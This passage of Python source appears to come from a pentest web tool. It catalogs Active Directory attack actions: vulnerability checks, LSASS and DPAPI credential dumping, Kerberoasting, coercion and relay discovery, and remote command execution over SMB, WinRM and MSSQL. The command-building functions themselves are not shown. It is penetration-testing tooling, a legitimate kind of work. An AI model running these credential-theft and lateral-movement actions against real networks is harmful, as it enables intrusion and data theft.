    dict(id="nopac", cat="Checks", label="noPac (CVE-2021-42278/87)",
         desc="NetExec nopac check.", build=b_nopac, requires=["user", "dc_ip"]),
    dict(id="printnightmare", cat="Checks", label="PrintNightmare",
         desc="NetExec printnightmare check.", build=b_printnightmare, requires=["user"]),
    dict(id="spooler", cat="Checks", label="Spooler status",
         desc="Is the print spooler reachable (PrinterBug pre-req)?", build=b_spooler, requires=["user"]),
    dict(id="ms17", cat="Checks", label="MS17-010 (EternalBlue)",
         desc="NetExec ms17-010 check.", build=b_ms17, requires=[]),

    # --- NetExec: Secrets & Dumping ---
    dict(id="nxc_dpapi", cat="Secrets & Dumping", label="nxc DPAPI",
         desc="Dump DPAPI secrets (saved creds, wifi, etc.).", build=b_nxc_dpapi, requires=["user"]),
    dict(id="nxc_dpapi_cookies", cat="Secrets & Dumping", label="nxc DPAPI cookies",
         desc="Dump browser cookies/logins via DPAPI.", build=b_nxc_dpapi_cookies, requires=["user"]),
    dict(id="nxc_lsassy", cat="Secrets & Dumping", label="nxc lsassy",
         desc="Remote LSASS dump via lsassy.", build=b_nxc_lsassy, requires=["user"]),
    dict(id="nxc_nanodump", cat="Secrets & Dumping", label="nxc nanodump",
         desc="LSASS dump via nanodump (evasive).", build=b_nxc_nanodump, requires=["user"]),
    dict(id="nxc_gpp", cat="Secrets & Dumping", label="nxc GPP passwords",
         desc="cpassword in SYSVOL + autologin.", build=b_nxc_gpp, requires=["user"]),
    dict(id="nxc_laps", cat="Secrets & Dumping", label="nxc LAPS",
         desc="Read LAPS local admin passwords.", build=b_nxc_laps, requires=["user"]),
    dict(id="nxc_veeam", cat="Secrets & Dumping", label="nxc Veeam",
         desc="Dump Veeam backup credentials.", build=b_nxc_veeam, requires=["user"]),
    dict(id="nxc_mremoteng", cat="Secrets & Dumping", label="nxc mRemoteNG",
         desc="Decrypt mRemoteNG saved connections.", build=b_nxc_mremoteng, requires=["user"]),
    dict(id="nxc_keepass", cat="Secrets & Dumping", label="nxc KeePass discover",
         desc="Find KeePass databases & processes.", build=b_nxc_keepass, requires=["user"]),
    dict(id="nxc_wifi", cat="Secrets & Dumping", label="nxc wireless keys",
         desc="Dump saved wireless passwords.", build=b_nxc_wifi, requires=["user"]),

    # --- NetExec: Enumeration ---
    dict(id="nxc_rid", cat="Enumeration", label="nxc RID brute",
         desc="Enumerate users via RID cycling.", build=b_nxc_rid, requires=["user"]),
    dict(id="nxc_sessions", cat="Enumeration", label="nxc sessions",
         desc="Active sessions on the host.", build=b_nxc_sessions, requires=["user"]),
    dict(id="nxc_disks", cat="Enumeration", label="nxc disks",
         desc="List drives/disks.", build=b_nxc_disks, requires=["user"]),
    dict(id="nxc_computers", cat="Enumeration", label="nxc computers",
         desc="Enumerate domain computers.", build=b_nxc_computers, requires=["user"]),
    dict(id="nxc_localgroups", cat="Enumeration", label="nxc local groups",
         desc="Local group membership.", build=b_nxc_localgroups, requires=["user"]),
    dict(id="nxc_enum_av", cat="Enumeration", label="nxc enum AV/EDR",
         desc="Detect installed AV / EDR.", build=b_nxc_enum_av, requires=["user"]),
    dict(id="nxc_gmsa", cat="Enumeration", label="nxc gMSA",
         desc="Read gMSA managed passwords (LDAP).", build=b_nxc_gmsa, requires=["user"]),
    dict(id="nxc_passnotreq", cat="Enumeration", label="nxc PASSWD_NOTREQD",
         desc="Accounts not requiring a password.", build=b_nxc_passnotreq, requires=["user"]),
    dict(id="nxc_userdesc", cat="Enumeration", label="nxc user descriptions",
         desc="Passwords hidden in user description fields.", build=b_nxc_userdesc, requires=["user"]),
    dict(id="nxc_trusts", cat="Enumeration", label="nxc domain trusts",
         desc="Enumerate AD trust relationships.", build=b_nxc_trusts, requires=["user"]),
    dict(id="nxc_maq", cat="Enumeration", label="nxc MachineAccountQuota",
         desc="Read ms-DS-MachineAccountQuota.", build=b_nxc_maq, requires=["user"]),
    dict(id="nxc_subnets", cat="Enumeration", label="nxc subnets",
         desc="AD sites & subnets.", build=b_nxc_subnets, requires=["user"]),
    dict(id="nxc_daclread", cat="Enumeration", label="nxc DACL read",
         desc="Read object DACLs (LDAP).", build=b_nxc_daclread, requires=["user"]),

    # --- NetExec: Kerberos / ADCS ---
    dict(id="nxc_asrep_ldap", cat="Kerberos & Creds", label="nxc AS-REP roast",
         desc="AS-REP roast over LDAP.", build=b_nxc_asrep_ldap, requires=["user"]),
    dict(id="nxc_kerb_ldap", cat="Kerberos & Creds", label="nxc Kerberoast",
         desc="Kerberoast over LDAP.", build=b_nxc_kerb_ldap, requires=["user"]),
    dict(id="nxc_adcs", cat="ADCS / Certificates", label="nxc ADCS enum",
         desc="Enumerate CAs/templates via LDAP.", build=b_nxc_adcs, requires=["user"]),

    # --- NetExec: Coercion / Checks ---
    dict(id="nxc_webdav", cat="Coercion / Relay", label="nxc WebDAV check",
         desc="Is the WebClient (WebDAV) service running? (relay pre-req)", build=b_nxc_webdav, requires=["user"]),
    dict(id="nxc_coerce", cat="Coercion / Relay", label="nxc coerce_plus",
         desc="Test all coercion methods via NetExec.", build=b_nxc_coerce, requires=["user"]),
    dict(id="nxc_ntlmv1", cat="Checks", label="nxc NTLMv1",
         desc="Is NTLMv1 allowed?", build=b_nxc_ntlmv1, requires=["user"]),
    dict(id="nxc_runasppl", cat="Checks", label="nxc RunAsPPL",
         desc="Is LSASS protected (RunAsPPL)?", build=b_nxc_runasppl, requires=["user"]),
    dict(id="nxc_timeroast", cat="Checks", label="nxc Timeroast",
         desc="Roast computer accounts via NTP (no creds).", build=b_nxc_timeroast, requires=["dc_ip"]),

    # --- NetExec: Execution & Files ---
    dict(id="nxc_exec", cat="Lateral Movement", label="nxc exec (cmd)",
         desc="Run a command via SMB.", build=b_nxc_exec,
         inputs=[T("command", "Command", "whoami /all", "whoami")], requires=["user"]),
    dict(id="nxc_exec_ps", cat="Lateral Movement", label="nxc exec (PowerShell)",
         desc="Run PowerShell via SMB.", build=b_nxc_exec_ps,
         inputs=[T("command", "PowerShell", "Get-Process")], requires=["user"]),
    dict(id="nxc_winrm_exec", cat="Lateral Movement", label="nxc winrm exec",
         desc="Run a command via WinRM.", build=b_nxc_winrm_exec,
         inputs=[T("command", "Command", "whoami", "whoami")], requires=["user"]),
    dict(id="nxc_mssql_query", cat="Lateral Movement", label="nxc MSSQL query",
         desc="Run a SQL query.", build=b_nxc_mssql_query,
         inputs=[T("query", "SQL", "SELECT @@version", "SELECT @@version")], requires=["user"]),
    dict(id="nxc_mssql_exec", cat="Lateral Movement", label="nxc MSSQL exec",
         desc="Command exec via xp_cmdshell.", build=b_nxc_mssql_exec,
         inputs=[T("command", "Command", "whoami", "whoami")], requires=["user"]),
    dict(id="nxc_putfile", cat="Lateral Movement", label="nxc put-file",
         desc="Upload a file over SMB.", build=b_nxc_putfile,
         inputs=[T("lfile", "Local path", "/tmp/file"), T("rfile", "Remote share path", "C$\\Windows\\Temp\\file")], requires=["user"]),
    dict(id="nxc_getfile", cat="Lateral Movement", label="nxc get-file",
         desc="Download a file over SMB.", build=b_nxc_getfile,
         inputs=[T("rfile", "Remote share path", "C$\\Windows\\Temp\\file"), T("lfile", "Local path", "/tmp/file")], requires=["user"]),

    # --- more AD checks ---
    dict(id="nxc_smbghost", cat="Checks", label="SMBGhost (CVE-2020-0796)",
         desc="SMBv3 compression RCE check.", build=b_nxc_smbghost, requires=[]),
    dict(id="nxc_smbsigning", cat="Checks", label="SMB signing required?",
         desc="Is SMB signing enforced on the host?", build=b_nxc_smbsigning, requires=["user"]),
    dict(id="nxc_relaylist", cat="Checks", label="SMB signing relay list",
         desc="List hosts with SMB signing NOT required (relay targets).", build=b_nxc_relaylist, requires=["user"]),
    dict(id="nxc_ldapchecker", cat="Checks", label="LDAP signing & channel binding",
         desc="Are LDAP signing / channel binding enforced? (relay surface)", build=b_nxc_ldapchecker, requires=["user"]),
    dict(id="nxc_sccm", cat="Checks", label="SCCM / MECM discovery",
         desc="Locate SCCM management points.", build=b_nxc_sccm, requires=["user"]),
    dict(id="nxc_wcc", cat="Checks", label="Host config audit (wcc)",
         desc="Windows security misconfiguration audit.", build=b_nxc_wcc, requires=["user"]),
    dict(id="nxc_petitpotam", cat="Checks", label="PetitPotam check (MS-EFSR)",
         desc="Is the host coercible via MS-EFSR?", build=b_nxc_petitpotam, requires=["user"]),
    dict(id="nxc_dfscoerce", cat="Checks", label="DFSCoerce check (MS-DFSNM)",
         desc="Is the DC coercible via MS-DFSNM?", build=b_nxc_dfscoerce, requires=["user"]),
    dict(id="find_delegation", cat="Checks", label="Delegation (findDelegation)",
         desc="Unconstrained / constrained / RBCD delegation.", build=b_find_delegation, requires=["user", "dc_ip"]),
    dict(id="pre2k", cat="Checks", label="Pre-2000 computer accounts",
         desc="Computers with default (pre-Windows-2000) passwords.", build=b_pre2k,
         inputs=[T("inputfile", "Computers file", "computers.txt", "computers.txt")], requires=["domain", "dc_ip"]),
    dict(id="goldenpac", cat="Checks", label="MS14-068 (goldenPac)",
         desc="Kerberos PAC validation flaw (legacy DCs).", build=b_goldenpac, requires=["user"]),
    dict(id="nxc_unconstrained", cat="Enumeration", label="nxc unconstrained delegation",
         desc="Accounts/computers trusted for delegation.", build=b_nxc_unconstrained, requires=["user"]),
    dict(id="nxc_admincount", cat="Enumeration", label="nxc adminCount=1",
         desc="Protected / privileged accounts.", build=b_nxc_admincount, requires=["user"]),
]

ACTIONS_BY_ID = {a["id"]: a for a in ACTIONS}


def _requirement_warnings(action: dict, ctx: dict) -> list[str]:
    labels = {
        "user": "a username (set a credential)",
        "domain": "a domain",
        "dc_ip": "the DC IP",
        "attacker_ip": "your attacker IP",
        "interface": "an interface",
    }
    warns = []
    for req in action.get("requires", []):
        if not ctx.get(req):
            warns.append(f"Missing {labels.get(req, req)}.")
    return warns


def serializable_catalog() -> list[dict]:
    """Catalog without the build callables, for the frontend."""
    out = []
    for a in ACTIONS:
        out.append({
            "id": a["id"], "cat": a["cat"], "label": a["label"], "desc": a["desc"],
            "inputs": a.get("inputs", []),
        })
    return out


# ---------------------------------------------------------------------------
# routes
# ---------------------------------------------------------------------------

@ad_bp.route("/ad")
def ad():
    eng = storage.load_engagement()
    catalog = serializable_catalog()
    # ordered category list preserving catalog order
    cats = []
    for a in catalog:
        if a["cat"] not in cats:
            cats.append(a["cat"])
    return render_template("ad.html", eng=eng, catalog=catalog, categories=cats)


@ad_bp.route("/ad/build", methods=["POST"])
def ad_build():
    payload = request.get_json(silent=True) or {}
    action = ACTIONS_BY_ID.get(payload.get("action_id"))
    if not action:
        return jsonify({"error": "unknown action"}), 400
    eng = storage.load_engagement()
    ctx = build_context(payload.get("params", {}), eng)
    command = action["build"](ctx)
    if ctx["proxychains"]:
        command = tools.proxychains_prefix() + command
    return jsonify({
        "command": command,
        "warnings": _requirement_warnings(action, ctx),
        "label": action["label"],
    })
